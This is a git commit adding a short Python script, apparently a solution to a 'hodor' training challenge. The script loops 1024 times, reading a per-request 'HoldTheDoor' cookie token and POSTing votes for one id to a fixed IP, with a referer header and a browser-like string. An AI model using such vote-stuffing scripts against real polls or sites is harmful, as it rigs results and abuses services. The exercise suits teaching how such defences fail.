7f493fb935b81f1241b5143461281bc66dfb09e2
Miguel22247 <nr2862002@gmail.com>
2021-05-31 18:18:09 -0300

    added for testing

---
+++ level_2/level2.py
@@ -0,0 +1,24 @@
+#!/usr/bin/python3
+ 
+ 
+"""hodor for level 2"""
+import requests
+from bs4 import BeautifulSoup
+
+page = "http://158.69.76.135/level2.php/"
+os = ("Mozilla/5.0 (Windows NT 10.0; Win64: x64; rv: 64.0 ""Gecko/20100101 Firefox/64.0")
+
+header = {
+	"os": os,
+	"referer": page
+}
+
+for i in range(0, 1024):
+	get = requests.get(page, headers = header)
+	cookies = get.cookies
+	dictionary = cookies.get_dict()
+	key = dictionary.get('HoldTheDoor')
+	payloader = {'id': '2780', 'key': key, 'holdthedoor': 'Enviar'}
+
+	result = requests.post(page, headers = header, data = payloader, cookies = cookies)
+	print("Vote n*{:d} send it with code {}".format(i, result, key))
